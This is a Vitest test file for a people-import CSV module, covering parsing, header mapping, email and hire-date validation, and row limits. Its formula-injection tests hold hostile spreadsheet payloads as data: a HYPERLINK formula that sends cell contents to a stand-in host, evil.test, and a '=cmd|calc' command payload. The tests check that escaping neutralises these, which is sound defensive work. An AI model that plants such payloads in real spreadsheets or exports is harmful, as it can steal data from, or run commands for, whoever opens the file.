import { describe, expect, it } from 'vitest'
import {
  detectHeaders,
  escapeCsvCell,
  importTemplateCsv,
  isValidEmail,
  MAX_IMPORT_ROWS,
  normalizeEmail,
  parseCsv,
  parseHireDate,
  shapeRows,
  toCsv,
  validateRowsStandalone,
  type ImportField,
} from '@/modules/people/csv'

/**
 * CSV parsing, validation, and safe export.
 *
 * This is the one place EverCalm ingests a file produced by somebody else, so
 * the hostile cases get as much attention as the happy path.
 */

describe('parsing', () => {
  it('reads a plain file', () => {
    expect(parseCsv('a,b\n1,2')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ])
  })

  it('handles quoted fields, commas inside quotes, and escaped quotes', () => {
    const text = 'name,note\n"Vega, Jordan","She said ""yes"""'
    expect(parseCsv(text)).toEqual([
      ['name', 'note'],
      ['Vega, Jordan', 'She said "yes"'],
    ])
  })

  it('handles newlines inside a quoted field', () => {
    expect(parseCsv('a,b\n"line one\nline two",x')).toEqual([
      ['a', 'b'],
      ['line one\nline two', 'x'],
    ])
  })

  it('handles CRLF line endings, which is what Excel produces', () => {
    expect(parseCsv('a,b\r\n1,2\r\n')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ])
  })

  it('strips a UTF-8 BOM rather than corrupting the first header', () => {
    const withBom = '﻿name,email\nAva,a@b.test'
    const [header] = parseCsv(withBom)
    expect(header?.[0]).toBe('name')
  })

  it('ignores blank trailing lines', () => {
    expect(parseCsv('a\n1\n\n\n')).toEqual([['a'], ['1']])
  })

  it('keeps interior blank rows, so line numbers stay true to the file', () => {
    expect(parseCsv('a\n1\n\n2\n')).toEqual([['a'], ['1'], [''], ['2']])
  })

  it('returns nothing for an empty file', () => {
    expect(parseCsv('')).toEqual([])
    expect(parseCsv('\n\n')).toEqual([])
  })
})

describe('header detection', () => {
  it('recognises common spellings', () => {
    const { mapping } = detectHeaders(['Full Name', 'E-Mail', 'Start Date', 'Reports To'])
    expect(mapping[0]).toBe('displayName')
    expect(mapping[1]).toBe('email')
    expect(mapping[2]).toBe('hiredOn')
    expect(mapping[3]).toBe('manager')
  })

  it('recognises industry-neutral location words', () => {
    // A salon says "Salon", a restaurant says "Restaurant", a shop says
    // "Store". None of them should have to rename their column.
    for (const word of ['Location', 'Site', 'Store', 'Salon', 'Restaurant', 'Branch']) {
      expect(detectHeaders([word]).mapping[0], `${word} should map to location`).toBe('location')
    }
  })

  it('reports columns it does not recognise instead of guessing', () => {
    const { mapping, unmapped } = detectHeaders(['Name', 'Email', 'Payroll ID', 'T-shirt size'])
    expect(Object.keys(mapping)).toHaveLength(2)
    expect(unmapped).toEqual(['Payroll ID', 'T-shirt size'])
  })

  it('does not map two columns to the same field', () => {
    const { mapping } = detectHeaders(['Name', 'Full Name'])
    expect(Object.values(mapping).filter((f) => f === 'displayName')).toHaveLength(1)
  })

  it('never maps anything to an organization id', () => {
    // The tenant always comes from the session. A column claiming to be an
    // organization id is simply not a field the importer knows about.
    const { mapping, unmapped } = detectHeaders(['organization_id', 'Organization', 'Tenant'])
    expect(Object.keys(mapping)).toHaveLength(0)
    expect(unmapped).toHaveLength(3)
  })
})

describe('email handling', () => {
  it('normalises case and whitespace', () => {
    expect(normalizeEmail('  Ava.Lindqvist@Example.TEST ')).toBe('ava.lindqvist@example.test')
  })

  it('accepts ordinary addresses', () => {
    for (const email of ['a@b.co', 'first.last+tag@sub.example.com', 'MARISOL@LUMEN.TEST']) {
      expect(isValidEmail(email), email).toBe(true)
    }
  })

  it('rejects malformed ones', () => {
    for (const email of ['', 'nope', 'a@b', 'a@@b.com', 'a b@c.com', 'a@b,c.com', 'a@b;c.com']) {
      expect(isValidEmail(email), email).toBe(false)
    }
  })
})

describe('hire dates', () => {
  it('reads ISO dates', () => {
    expect(parseHireDate('2026-09-01').date).toBe('2026-09-01')
    expect(parseHireDate('2026-9-1').date).toBe('2026-09-01')
  })

  it('reads US month-first dates', () => {
    expect(parseHireDate('09/01/2026').date).toBe('2026-09-01')
  })

  it('reads a day-first date when the first part cannot be a month', () => {
    expect(parseHireDate('25/12/2026').date).toBe('2026-12-25')
  })

  it('reads written months', () => {
    expect(parseHireDate('1 September 2026').date).toBe('2026-09-01')
  })

  it('treats an empty cell as no date rather than an error', () => {
    expect(parseHireDate('   ')).toEqual({ date: null, error: null })
  })

  it('rejects dates that do not exist', () => {
    expect(parseHireDate('2026-02-30').error).toBeTruthy()
    expect(parseHireDate('2026-13-01').error).toBeTruthy()
  })

  it('rejects unreadable text', () => {
    expect(parseHireDate('whenever').error).toBeTruthy()
  })
})

describe('formula injection in exported reports', () => {
  // A cell beginning =, +, - or @ executes when a spreadsheet opens the file.
  // The error report echoes an untrusted upload, so this is the difference
  // between a report and an attack on whoever opens it.
  it('neutralises every dangerous prefix', () => {
    expect(escapeCsvCell('=1+1')).toBe("'=1+1")
    expect(escapeCsvCell('+1')).toBe("'+1")
    expect(escapeCsvCell('-1')).toBe("'-1")
    expect(escapeCsvCell('@SUM(A1)')).toBe("'@SUM(A1)")
  })

  it('neutralises the classic exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.test?"&A1,"Click")'
    const escaped = escapeCsvCell(payload)

    // It contains a comma and quotes, so it is ALSO CSV-quoted. The thing that
    // matters is what a spreadsheet sees after unquoting: text, not a formula.
    expect(escaped.startsWith('"')).toBe(true)
    const roundTripped = parseCsv(escaped)[0]?.[0]
    expect(roundTripped).toBe(`'${payload}`)
    expect(roundTripped?.startsWith('=')).toBe(false)
  })

  it('neutralises a payload hidden behind leading whitespace', () => {
    // Some spreadsheets trim before deciding whether a cell is a formula.
    expect(escapeCsvCell('  =cmd|calc')).toMatch(/^'/)
    expect(escapeCsvCell('\t=1+1')).toMatch(/^'/)
  })

  it('leaves ordinary values alone', () => {
    expect(escapeCsvCell('Ava Lindqvist')).toBe('Ava Lindqvist')
    expect(escapeCsvCell('2026-09-01')).toBe('2026-09-01')
    expect(escapeCsvCell('')).toBe('')
  })

  it('still quotes values containing commas, quotes, or newlines', () => {
    expect(escapeCsvCell('Vega, Jordan')).toBe('"Vega, Jordan"')
    expect(escapeCsvCell('She said "yes"')).toBe('"She said ""yes"""')
    expect(escapeCsvCell('line\nbreak')).toBe('"line\nbreak"')
  })

  it('escapes a dangerous value that also needs quoting', () => {
    const escaped = escapeCsvCell('=1,2')
    expect(escaped).toBe('"\'=1,2"')
    // Round-trips back to the neutralised text, not to a formula.
    expect(parseCsv(escaped)[0]?.[0]).toBe("'=1,2")
  })

  it('applies the escaping through toCsv', () => {
    const csv = toCsv([
      ['Line', 'Name'],
      ['2', '=HYPERLINK("http://evil.test")'],
    ])
    expect(csv).toContain("'=HYPERLINK")
    expect(csv.split('\r\n')[1]?.startsWith('2,')).toBe(true)
  })

  it('produces a template that is itself safe and re-readable', () => {
    const parsed = parseCsv(importTemplateCsv())
    expect(parsed[0]).toContain('Full name')
    expect(parsed[0]).toContain('Email')
    expect(parsed).toHaveLength(2)
  })
})

describe('row shaping and standalone validation', () => {
  const mapping: Record<number, ImportField> = { 0: 'displayName', 1: 'email', 2: 'hiredOn' }

  function shape(csv: string) {
    return shapeRows(parseCsv(csv), mapping)
  }

  it('numbers rows by their line in the file, so errors are findable', () => {
    const { rows } = shape('name,email,hired\nAva,a@b.test,\nBea,b@b.test,')
    expect(rows.map((r) => r.lineNumber)).toEqual([2, 3])
  })

  it('keeps numbering true when the file has a blank line in the middle', () => {
    // Somebody opening the file in a spreadsheet sees Bea on line 4. An error
    // that says "line 3" would send them to the wrong row.
    const { rows } = shape('name,email,hired\nAva,a@b.test,\n,,\nBea,b@b.test,')
    expect(rows.map((r) => r.lineNumber)).toEqual([2, 4])
  })

  it('refuses a file with only a header', () => {
    expect(shape('name,email,hired').error).toMatch(/no rows/i)
  })

  it('refuses more rows than the limit', () => {
    const body = Array.from(
      { length: MAX_IMPORT_ROWS + 1 },
      (_, i) => `Person ${i},p${i}@example.test,`,
    ).join('\n')
    const result = shape(`name,email,hired\n${body}`)
    expect(result.error).toMatch(new RegExp(String(MAX_IMPORT_ROWS)))
    expect(result.rows).toHaveLength(0)
  })

  it('accepts exactly the limit', () => {
    const body = Array.from(
      { length: MAX_IMPORT_ROWS },
      (_, i) => `Person ${i},p${i}@example.test,`,
    ).join('\n')
    expect(shape(`name,email,hired\n${body}`).error).toBeNull()
  })

  it('requires a name and an email', () => {
    // Line 2 is empty in every mapped column except an unreadable date, so it
    // collects one issue per problem rather than stopping at the first.
    const { rows } = shape('name,email,hired\n,,x\nAva Lindqvist,not-an-email,')
    const issues = validateRowsStandalone(rows)
    expect(
      issues
        .get(2)
        ?.map((i) => i.field)
        .sort(),
    ).toEqual(['displayName', 'email', 'hiredOn'])
    expect(issues.get(3)?.[0]?.message).toMatch(/not a valid email/i)
  })

  it('detects a duplicate email within the same file, and names the line', () => {
    const { rows } = shape('name,email,hired\nAva Lindqvist,same@b.test,\nBea Ortiz,SAME@B.TEST,')
    const issues = validateRowsStandalone(rows)
    expect(issues.get(2)).toBeUndefined()
    expect(issues.get(3)?.[0]?.message).toMatch(/Duplicate of line 2/)
  })

  it('reports an unreadable hire date against the row', () => {
    const { rows } = shape('name,email,hired\nAva Lindqvist,a@b.test,whenever')
    expect(validateRowsStandalone(rows).get(2)?.[0]?.field).toBe('hiredOn')
  })

  it('passes a clean file with no issues at all', () => {
    const { rows } = shape('name,email,hired\nAva,ava@example.test,2026-09-01')
    expect(validateRowsStandalone(rows).size).toBe(0)
  })
})
